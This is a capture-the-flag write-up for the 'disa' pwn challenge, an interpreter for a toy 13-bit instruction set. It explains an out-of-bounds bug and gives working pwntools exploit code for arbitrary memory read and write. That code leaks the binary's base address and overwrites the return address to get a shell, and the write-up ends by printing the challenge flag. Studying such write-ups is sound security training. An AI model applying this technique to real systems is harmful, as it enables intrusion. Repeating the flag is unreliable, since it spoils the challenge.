# D.I.S.A

This program provides an interpreter for D.I.S.A. (Dumb Instruction Set Architecture), a language built for 13-bit computers.

The instruction set works on one register (called `dat`) which is meant to contain 13 bits but is stored as a 16-bit value.
It also contains an array of 13 bit ints (stored again as 16 bit ints) called `cells` with an index called `addr`.

The following instructions are defined:
- `NOP` - does nothing
- `ST` - sets `cells[addr]` to `dat`
- `LD` - sets `dat` to `cells[addr]`
- `PUT num` - sets `dat` to num. Does not allow anything outside of 13 bit range.
- `JMP` - sets `addr` to `dat`
- `ADD` - adds `dat` to `cells[addr]`
- `RD` - prints `dat` to the screen
- `END` - exits program

The vulnerability here is that the only check for numbers being in the 13 bit range is within `PUT`.
`ADD`, however, can be called repeatedly, and then `LD` can be used to set `dat` to any value.

Here's a Python function to `JMP` to an arbitrary address:

```python
def jmp_index(index):
    # cells[0] = 0
    io.sendline(b'PUT 0')
    io.sendline(b'JMP')
    io.sendline(b'ST')

    # cells[0] = index
    while index > 0:
        if index > MAX_VAL_SIGNED:
            chunk = MAX_VAL_SIGNED
        else:
            chunk = index
        io.sendline(b'PUT ' + str(chunk).encode("utf-8"))
        io.sendline(b'ADD')
        index = index - chunk

    # addr = index
    io.sendline(b'LD')
    io.sendline(b'JMP')
```

Using this, we can write a function to read 8 bytes of memory off from any "index" (including if we overflow)

```python
def get_index(index):
    jmp_index(index)

    # read value to screen
    io.sendline(b'LD')
    io.sendline(b'RD')
    return int((struct.pack('>h', int(io.recvline())).hex()),16)

def get_8bytes(index):
    val = 0
    for i in range(4):
        val += get_index(index - (3 - i)) << (16 * i)
    return val
```

Likewise, we can write a similar pair of  function to store any 8 bytes at any "index"

```python
def set_index(index, value):
    jmp_index(index)
    io.sendline(b'PUT 0')
    io.sendline(b'ST')

    while value != 0:
        if value > MAX_VAL_SIGNED:
            chunk = MAX_VAL_SIGNED
        else:
            chunk = value
        io.sendline(b'PUT ' + str(chunk).encode("utf-8"))
        io.sendline(b'ADD')
        value = value - chunk

def set_8bytes(index, value):
    for i in range(4):
        set_index(index - i, (value >> (16 * (3 - i))) & 0xFFFF )
```

To determine where bytes are aligned, I first printed out a large region of indeces, and after 
some experimentation found that the canary was at an index of `8207`, since those 8 bytes were
random with each run.

This let me find the return address at an index of `8215`, and the address of
the main function at an index of `8231` which let me build this program:

```python
import pwn

pwn.context.binary = elf = pwn.ELF("./disa")
if pwn.args.REMOTE:
    io = pwn.remote("challs.pwnoh.io",13430)
else:
    io = pwn.process("./disa")


return_idx = 8215
main_idx = return_idx + 16

ret = get_8bytes(return_idx)
main = get_8bytes(main_idx)
base = main - elf.symbols['main']
win = base + elf.symbols['win']

set_8bytes(return_idx, win)

io.sendline(b'END')
io.interactive()

```

Running this gave me a shell, which included "flag.txt". I `cat`'d the flag, which gave
me the following flag: `bctf{w417_4c7u411y_13_b17_c0mpu73r5_fuck1n9_5uck}`

